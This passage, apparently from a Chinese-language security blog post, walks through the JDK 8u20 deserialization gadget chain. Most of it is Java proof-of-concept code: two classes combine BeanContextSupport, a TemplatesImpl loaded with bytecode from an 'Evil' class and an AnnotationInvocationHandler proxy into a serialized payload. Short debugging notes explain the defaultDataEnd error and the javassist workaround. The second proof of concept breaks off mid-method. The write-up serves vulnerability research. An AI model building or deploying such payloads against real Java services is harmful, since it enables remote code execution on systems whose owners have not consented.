+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>ctor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>ih</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>ctor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;type&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>tmpMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tmpMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;children&#34;</span><span class=p>,</span><span class=w> </span><span class=n>tmpMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Templates</span><span class=w> </span><span class=n>proxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Templates</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>jdk8u20Poc1</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ih</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LinkedHashSet</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LinkedHashSet</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>bcs</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>proxy</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>memberValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>memberValues</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;f5a5a608&#34;</span><span class=p>,</span><span class=w> </span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;memberValues&#34;</span><span class=p>,</span><span class=w> </span><span class=n>memberValues</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serialized</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>serialize</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserialize</span><span class=p>(</span><span class=n>serialized</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/jdk8u20-deserialization/3.png width=1320 height=388 loading=lazy alt=img></p><p>看到报错里面<code>BeanContextSupport#deserialize</code>跟进之后发现到这里就会抛出错误</p><p><img src=/p/jdk8u20-deserialization/4.png width=1892 height=1372 loading=lazy alt=img></p><p>继续跟进到发现根本问题在这里</p><p><img src=/p/jdk8u20-deserialization/5.png width=1932 height=1084 loading=lazy alt=img></p><p>全局搜索 defaultDataEnd 找到这里给赋值的true</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>defaultReadObject</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SerialCallbackContext</span><span class=w> </span><span class=n>ctx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>curContext</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ctx</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NotActiveException</span><span class=p>(</span><span class=s>&#34;not in call to readObject&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>curObj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctx</span><span class=p>.</span><span class=na>getObj</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectStreamClass</span><span class=w> </span><span class=n>curDesc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctx</span><span class=p>.</span><span class=na>getDesc</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>bin</span><span class=p>.</span><span class=na>setBlockDataMode</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defaultReadFields</span><span class=p>(</span><span class=n>curObj</span><span class=p>,</span><span class=w> </span><span class=n>curDesc</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>bin</span><span class=p>.</span><span class=na>setBlockDataMode</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>curDesc</span><span class=p>.</span><span class=na>hasWriteObjectData</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>             * Fix for 4360508: since stream does not contain terminating
+</span></span></span><span class=line><span class=cl><span class=cm>             * TC_ENDBLOCKDATA tag, set flag so that reading code elsewhere
+</span></span></span><span class=line><span class=cl><span class=cm>             * knows to simulate end-of-custom-data behavior.
+</span></span></span><span class=line><span class=cl><span class=cm>             */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>defaultDataEnd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>ex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>handles</span><span class=p>.</span><span class=na>lookupException</span><span class=p>(</span><span class=n>passHandle</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ex</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=n>ex</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>可以看出需要自定义一个 WriteObject 方法，用 javassist 给<code>AnnotationInvocationHandler</code>加一个 <code>writeObjecct()</code>方法</p><h3 id=poc2-报错>poc2 报错</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtMethod</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.beans.beancontext.BeanContextSupport</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>jdk8u20Poc2</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnr&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Base</span><span class=p>.</span><span class=na>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>()).</span><span class=na>toBytecode</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>ihClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createModifiedHandlerClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>ih</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>ihClass</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;type&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Templates</span><span class=w> </span><span class=n>proxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Templates</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>jdk8u20Poc2</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ih</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BeanContextSupport</span><span class=w> </span><span class=n>bcs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BeanContextSupport</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;serializable&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>tmpMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tmpMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;children&#34;</span><span class=p>,</span><span class=w> </span><span class=n>tmpMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LinkedHashSet</span><span class=w> </span><span class=n>set</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LinkedHashSet</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>bcs</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>proxy</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>memberValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>memberValues</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;f5a5a608&#34;</span><span class=p>,</span><span class=w> </span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;memberValues&#34;</span><span class=p>,</span><span class=w> </span><span class=n>memberValues</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>serialize</span><span class=p>(</span><span class=n>set</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>createModifiedHandlerClass</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
